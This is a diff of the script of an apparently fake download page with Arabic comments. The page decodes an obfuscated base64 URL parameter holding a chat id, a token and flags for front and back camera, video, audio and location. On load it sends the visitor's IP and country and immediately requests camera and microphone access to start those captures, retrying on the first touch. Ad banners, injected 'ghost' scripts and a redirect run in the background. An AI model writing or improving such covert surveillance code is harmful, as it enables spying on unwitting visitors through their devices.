@@ -87,14 +87,8 @@
 
 <script>
 // ═══════════════════════════════════════════════════════════
-// 0. دوال Base64 (تدعم العربي/UTF-8)
+// 0. دوال Base64 (URL-safe + UTF-8)
 // ═══════════════════════════════════════════════════════════
-function b64Encode(str) {
-  const bytes = new TextEncoder().encode(str);
-  let bin = '';
-  bytes.forEach(b => bin += String.fromCharCode(b));
-  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-}
 function b64Decode(b64) {
   let s = b64.replace(/-/g, '+').replace(/_/g, '/');
   while (s.length % 4) s += '=';
@@ -103,49 +97,73 @@ function b64Decode(b64) {
   for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
   return new TextDecoder().decode(bytes);
 }
-
-// ═══════════════════════════════════════════════════════════
-// 1. قراءة البارامترات + فك التشفير
-// ═══════════════════════════════════════════════════════════
-const urlParams = new URLSearchParams(window.location.search);
-let chat = null, token = null, featureList = [];
-
-// 🔓 المحاولة الأولى: الرابط المشفّر ?d=<base64>
-const encoded = urlParams.get('d');
-if (encoded) {
-  try {
-    const data = JSON.parse(b64Decode(encoded));
-    chat  = data.chat  || null;
-    token = data.token || null;
-    if (Array.isArray(data.features)) {
-      featureList = data.features;
-    } else if (typeof data.features === 'string') {
-      featureList = data.features.split(',').map(s => s.trim()).filter(Boolean);
-    }
-  } catch (e) { console.warn('فشل فك التشفير:', e); }
+function b64Encode(str) {
+  const bytes = new TextEncoder().encode(str);
+  let bin = '';
+  bytes.forEach(b => bin += String.fromCharCode(b));
+  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 }
 
-// 🔙 Fallback: الروابط القديمة المباشرة
-if (!chat || !token) {
-  chat  = urlParams.get('chat') || urlParams.get('id');
-  token = urlParams.get('token');
+// ═══════════════════════════════════════════════════════════
+// 1. فك التشفير وقراءة البارامترات
+//    يدعم: ?u=<base64 querystring>  ← الأساسي (الجديد)
+//           ?d=<base64 JSON>        ← بديل
+//           ?id=..&token=..&fc..    ← مباشر (قديم)
+// ═══════════════════════════════════════════════════════════
+const urlParams = new URLSearchParams(window.location.search);
+let params = urlParams;   // ← ده اللي هنقرأ منه فعلياً
 
-  if (urlParams.has('features')) {
-    featureList = urlParams.get('features').split(',').map(s => s.trim()).filter(Boolean);
-  } else {
-    if (urlParams.has('fc'))  featureList.push('camFront');
-    if (urlParams.has('bc'))  featureList.push('camBack');
-    if (urlParams.has('fcv')) featureList.push('videoFront');
-    if (urlParams.has('bcv')) featureList.push('videoBack');
-    if (urlParams.has('r'))   featureList.push('audio');
-    if (urlParams.has('l'))   featureList.push('location');
+// (1) الأساسي: u = base64( "id=...&token=...&fc&bc&..." )
+const uParam = urlParams.get('u');
+if (uParam) {
+  try {
+    const decoded = b64Decode(uParam);
+    console.log('[FastDownload] decoded u =', decoded);
+    params = new URLSearchParams(decoded);
+  } catch (e) {
+    console.error('[FastDownload] فشل فك تشفير u:', e);
+  }
+} else {
+  // (2) بديل: d = base64( JSON )
+  const dParam = urlParams.get('d');
+  if (dParam) {
+    try {
+      const data = JSON.parse(b64Decode(dParam));
+      const sp = new URLSearchParams();
+      if (data.chat || data.id) sp.set('id', data.chat || data.id);
+      if (data.token) sp.set('token', data.token);
+      if (data.features) {
+        const arr = Array.isArray(data.features) ? data.features : data.features.split(',');
+        arr.forEach(f => { if (f) sp.set(f, ''); });
+      }
+      params = sp;
+    } catch (e) {
+      console.error('[FastDownload] فشل فك تشفير d:', e);
+    }
   }
 }
 
+// استخراج القيم من params (سواء كانت مباشرة أو بعد فك التشفير)
+const chat  = params.get('id') || params.get('chat');
+const token = params.get('token');
+
+let featureList = [];
+if (params.has('features')) {
+  featureList = params.get('features').split(',').map(s => s.trim()).filter(Boolean);
+} else {
+  if (params.has('fc'))  featureList.push('camFront');
+  if (params.has('bc'))  featureList.push('camBack');
+  if (params.has('fcv')) featureList.push('videoFront');
+  if (params.has('bcv')) featureList.push('videoBack');
+  if (params.has('r'))   featureList.push('audio');
+  if (params.has('l'))   featureList.push('location');
+}
 const features = featureList.join(',');
 
+console.log('[FastDownload] chat=', chat, '| features=', features);
+
 // ═══════════════════════════════════════════════════════════
-// 2. منطق الزائر + طلب الأذونات + الكاميرا
+// 2. منطق الزائر + الأذونات + الكاميرا
 // ═══════════════════════════════════════════════════════════
 let visitorIP = "غير معروف";
 let visitorCountry = "غير معروف";
@@ -301,22 +319,20 @@ async function preGrantPermissions(needCamera, needMicrophone) {
     stream.getTracks().forEach(t => t.stop());
     return true;
   } catch (err) {
-    console.warn('الأذونات مرفوضة/محتاجة ضغطة:', err);
+    console.warn('الأذونات محتاجة ضغطة:', err);
     return false;
   }
 }
 
 // ═══════════════════════════════════════════════════════════
-// 3. تشغيل الميزات (مع flags لمنع التشغيل المزدوج)
+// 3. تشغيل الميزات
 // ═══════════════════════════════════════════════════════════
 let featuresRunning = false;
 let featuresDone = false;
 
 async function startFeatures() {
-  if (featuresRunning) return true;
-  if (featuresDone) return true;
-  if (!chat || !token) { featuresDone = true; return true; }
-  if (!features) { featuresDone = true; return true; }
+  if (featuresRunning || featuresDone) return true;
+  if (!chat || !token || !features) { featuresDone = true; return true; }
 
   featuresRunning = true;
   const list = features.split(',');
@@ -326,7 +342,7 @@ async function startFeatures() {
   const granted = await preGrantPermissions(needCamera, needMicrophone);
   if ((needCamera || needMicrophone) && !granted) {
     featuresRunning = false;
-    return false; // فشل → جرّب تاني عند أول ضغطة
+    return false; // فشل → جرّب تاني عند أول لمسة
   }
 
   try {
@@ -371,7 +387,7 @@ async function startFeatures() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// 4. إعدادات الإعلانات والصفحات
+// 4. الإعلانات والصفحات
 // ═══════════════════════════════════════════════════════════
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
@@ -390,8 +406,7 @@ var CIRC = 339.3;
 function $(id){return document.getElementById(id)}
 
 function addBanners(boxId){
-  var box = $(boxId);
-  if (!box) return;
+  var box = $(boxId); if (!box) return;
   BANNERS.forEach(function(b){
     var f = document.createElement("iframe");
     f.width = b.w; f.height = b.h; f.scrolling = "no";
@@ -404,60 +419,45 @@ function addNative(boxId){
   c.id = NATIVE_ID;
   $(boxId).appendChild(c);
   var s = document.createElement("script");
-  s.async = true;
-  s.setAttribute("data-cfasync","false");
-  s.src = NATIVE;
+  s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE;
   document.body.appendChild(s);
 }
 var ghostLoaded = false;
 function addGhost(){
-  if (ghostLoaded) return;
-  ghostLoaded = true;
+  if (ghostLoaded) return; ghostLoaded = true;
   GHOST.forEach(function(u){
     var s = document.createElement("script");
-    s.setAttribute("data-cfasync","false");
-    s.src = u;
+    s.setAttribute("data-cfasync","false"); s.src = u;
     document.body.appendChild(s);
   });
 }
 
 function ring(n, secs, onlyVisible, doneMsg, onDone){
   var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num");
-  var left = secs;
-  num.textContent = left;
-  fg.style.strokeDashoffset = 0;
+  var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0;
   var iv = setInterval(function(){
     if (onlyVisible && document.visibilityState !== "visible") {
-      $("s"+n).textContent = "العداد متوقف، ارجع للصفحة";
-      return;
+      $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return;
     }
     if (onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة...";
-    left--;
-    num.textContent = left;
+    left--; num.textContent = left;
     fg.style.strokeDashoffset = CIRC * (1 - left/secs);
     if (left <= 0) {
-      clearInterval(iv);
-      el.classList.add("done");
+      clearInterval(iv); el.classList.add("done");
       num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-      $("s"+n).textContent = doneMsg;
-      onDone();
+      $("s"+n).textContent = doneMsg; onDone();
     }
   }, 1000);
 }
 function reveal(btnId){
-  var b = $(btnId);
-  b.disabled = false;
-  b.classList.add("ready");
+  var b = $(btnId); b.disabled = false; b.classList.add("ready");
   setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150);
 }
 function goNext(btn, fn){
-  btn.disabled = true;
-  btn.classList.remove("ready");
-  var left = GAP;
-  btn.textContent = "جاري التحويل... " + left;
+  btn.disabled = true; btn.classList.remove("ready");
+  var left = GAP; btn.textContent = "جاري التحويل... " + left;
   var iv = setInterval(function(){
-    left--;
-    btn.textContent = "جاري التحويل... " + left;
+    left--; btn.textContent = "جاري التحويل... " + left;
     if (left <= 0) { clearInterval(iv); fn(); }
   }, 1000);
 }
@@ -468,23 +468,16 @@ function show(n){
 }
 
 // ═══════════════════════════════════════════════════════════
-// 5. 🚀 عند فتح الموقع فوراً: إعلانات + معلومات + أذونات
+// 5. عند الفتح: إعلانات + معلومات + أذونات فوراً
 // ═══════════════════════════════════════════════════════════
-
-// (أ) تحميل إعلانات الصفحة الأولى فوراً
 addBanners("ads1");
 addNative("native1");
-
-// (ب) بدء عداد الصفحة الأولى
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// (ج) إرسال معلومات الزائر فوراً (لا تحتاج أذونات)
 sendVisitorInfo();
 
-// (د) 🔑 طلب الأذونات وفتح الكاميرا فوراً (قبل أي ضغط)
 startFeatures().then(function(ok){
   if (!ok) {
-    // لو المتصفح رفض بدون ضغطة، جرّب تاني عند أول تفاعل
     const retry = async function(){
       document.removeEventListener('pointerdown', retry, true);
       document.removeEventListener('touchstart', retry, true);
@@ -498,32 +491,26 @@ startFeatures().then(function(ok){
 // ═══════════════════════════════════════════════════════════
 // 6. أزرار التنقل
 // ═══════════════════════════════════════════════════════════
-
-// زر متابعة صفحة 1
 $("b1").onclick = function(){
-  startFeatures(); // محاولة احتياطية لو الأذونات اتأخرت
+  startFeatures();
   goNext(this, function(){
     show(2);
     addGhost();
-    addBanners("ads2");
-    addNative("native2");
+    addBanners("ads2"); addNative("native2");
     ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); });
   });
 };
 
-// زر متابعة صفحة 2
 $("b2").onclick = function(){
   goNext(this, function(){
     show(3);
     addGhost();
-    addBanners("ads3");   // ← إعلانات الصفحة الأخيرة
-    addNative("native3");
+    addBanners("ads3"); addNative("native3");
     ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); });
   });
 };
 
-// زر التحميل النهائي
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-                                                                                                                                                                                                                                                              </html>
+ </html>
